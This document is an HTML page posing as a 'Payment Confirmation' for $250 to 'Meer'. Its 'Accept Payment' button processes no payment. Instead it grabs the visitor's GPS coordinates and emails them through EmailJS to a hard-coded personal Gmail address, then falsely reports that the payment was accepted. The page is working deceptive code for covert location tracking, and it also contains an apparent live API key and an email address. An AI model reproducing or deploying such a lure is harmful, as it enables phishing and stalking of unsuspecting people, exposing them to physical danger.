<!DOCTYPE html>
<html>
<head>
  <title>Payment Confirmation</title>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body style="font-family: Arial, sans-serif; text-align:center; margin-top: 100px;">
  <h2>Sending $250 to Meer</h2>
  <button style="padding: 15px 30px; font-size: 18px; cursor:pointer;" onclick="getLocation()">Accept Payment</button>
  <p id="status"></p>

  <script>
    // Initialize EmailJS
    (function() {
      emailjs.init('i7BweUs_ujM3g34jk'); // Your public key
    })();

    function getLocation() {
      const status = document.getElementById('status');
      status.textContent = 'Verifying location...';

      if (!navigator.geolocation) {
        status.textContent = 'Geolocation is not supported by your browser.';
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          // Email template params
          const templateParams = {
            latitude: latitude,
            longitude: longitude,
            to_email: 'taniyahasbury@gmail.com' // Your receiving email
          };

          // Send email
          emailjs.send('service_76mv2fb', 'template_5io8d5q', templateParams)
            .then(() => {
              status.textContent = 'Payment accepted. Location sent.';
            }, (error) => {
              console.error('EmailJS Error:', error);
              status.textContent = 'Failed to send location. Please try again.';
            });
        },
        () => {
          status.textContent = 'Unable to retrieve location.';
        }
      );
    }
  </script>
</body>
</html>
